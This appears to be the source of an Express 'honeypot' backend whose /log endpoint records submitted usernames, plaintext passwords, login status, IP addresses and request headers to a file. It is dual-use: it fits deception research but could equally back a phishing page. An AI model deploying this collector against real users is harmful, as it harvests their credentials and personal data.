import express from "express";
import fs from "fs";
import path from "path";
import cors from "cors";
import helmet from "helmet";
import morgan from "morgan";
import dotenv from "dotenv";

dotenv.config();
const app = express();
const PORT = process.env.PORT || 5000;
const LOG_FILE = process.env.LOG_FILE || "./logs/attempts.log";

app.use(helmet());
app.use(cors());
app.use(express.json());

// simple request logging to console + file
app.use(morgan("combined", {
  stream: fs.createWriteStream(path.join("logs", "access.log"), { flags: "a" })
}));

// Ensure logs directory exists
fs.mkdirSync(path.dirname(LOG_FILE), { recursive: true });

app.post("/log", (req, res) => {
  const {
    username = "",
    password = "",
    status = "UNKNOWN",        // frontend sends SUCCESS or FAILED
    timestamp = new Date().toISOString()
  } = req.body;

  const payload = {
    username,
    password,
    status,                    // <-- now logged!
    timestamp,                // <-- now logged!
    headers: {
      "user-agent": req.headers["user-agent"],
      referer: req.headers.referer ?? req.headers.referrer ?? null,
      host: req.headers.host
    },
    ip: req.ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress
  };

  // Append JSON line to attempts.log
  fs.appendFileSync(LOG_FILE, JSON.stringify(payload) + "\n", { encoding: "utf8" });

  // Use correct HTTP codes for logging
  const httpCode = status === "SUCCESS" ? 200 : 401;

  return res.status(httpCode).json({ logged: true });
});


// health route
app.get("/health", (req, res) => res.json({ ok: true }));

app.listen(PORT, () => console.log(`Honeypot backend running on http://localhost:${PORT}`));
